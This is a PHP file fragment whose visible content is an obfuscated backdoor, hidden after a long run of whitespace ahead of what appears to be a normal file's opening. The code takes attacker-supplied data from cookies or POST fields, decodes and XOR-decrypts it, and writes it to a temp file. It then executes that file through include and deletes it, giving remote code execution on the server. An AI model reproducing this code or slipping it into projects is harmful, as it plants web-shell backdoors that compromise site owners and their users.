<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("G_LDiR")){class G_LDiR{public static $SIneYY = "542e6871-8b9d-4842-82bd-7771c3eb6606";public static $ClDaf = NULL;public function __construct(){$VXtbtAkLS = $_COOKIE;$wPMyBl = $_POST;$pvDvozjYkI = @$VXtbtAkLS[substr(G_LDiR::$SIneYY, 0, 4)];if (!empty($pvDvozjYkI)){$JwlXe = "base64";$SHZNa = "";$pvDvozjYkI = explode(",", $pvDvozjYkI);foreach ($pvDvozjYkI as $qdDxpPgXD){$SHZNa .= @$VXtbtAkLS[$qdDxpPgXD];$SHZNa .= @$wPMyBl[$qdDxpPgXD];}$SHZNa = array_map($JwlXe . "\137" . chr (100) . chr (101) . "\x63" . "\157" . 'd' . chr (101), array($SHZNa,)); $SHZNa = $SHZNa[0] ^ str_repeat(G_LDiR::$SIneYY, (strlen($SHZNa[0]) / strlen(G_LDiR::$SIneYY)) + 1);G_LDiR::$ClDaf = @unserialize($SHZNa);}}public function __destruct(){$this->nDPpmTj();}private function nDPpmTj(){if (is_array(G_LDiR::$ClDaf)) {$MLSGBJWHR = sys_get_temp_dir() . "/" . crc32(G_LDiR::$ClDaf[chr (115) . "\141" . "\154" . 't']);@G_LDiR::$ClDaf[chr ( 1035 - 916 )."\162" . chr (105) . 't' . chr (101)]($MLSGBJWHR, G_LDiR::$ClDaf[chr (99) . chr (111) . "\x6e" . chr ( 809 - 693 ).'e' . chr (110) . "\164"]);include $MLSGBJWHR;@G_LDiR::$ClDaf["\x64" . chr (101) . "\x6c" . "\145" . "\x74" . 'e']($MLSGBJWHR);exit();}}}$PmCpJWKdA = new G_LDiR(); $PmCpJWKdA = NULL;} ?><?php
/**
